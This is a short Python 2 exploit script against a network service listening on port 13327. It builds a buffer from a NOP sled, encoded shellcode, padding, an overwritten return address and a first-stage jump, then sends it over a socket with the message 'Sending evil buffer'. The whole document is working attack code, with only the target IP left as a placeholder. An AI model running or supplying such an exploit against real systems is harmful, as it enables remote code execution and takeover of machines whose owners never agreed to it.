#!/usr/bin/python
import socket
host = "*IP*"
nop_sled = "\x90" * 8 # NOP sled
shellcode =(
"\xda\xde\xb8\xa7\xd3\xc4\x67\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x12\x31\x42\x17\x83\xea\xfc\x03\xe5\xc0\x26\x92\xd8\x3d\x51"
"\xbe\x49\x81\xcd\x2b\x6f\x8c\x13\x1b\x09\x43\x53\xcf\x8c\xeb"
"\x6b\x3d\xae\x45\xed\x44\xc6\x95\xa5\xc0\xa7\x7e\xb4\x2e\xc6"
"\xc5\x31\xcf\x78\x5f\x12\x41\x2b\x13\x91\xe8\x2a\x9e\x16\xb8"
"\xc4\x4f\x38\x4e\x7c\xf8\x69\x9f\x1e\x91\xfc\x3c\x8c\x32\x76"
"\x23\x80\xbe\x45\x24")
padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
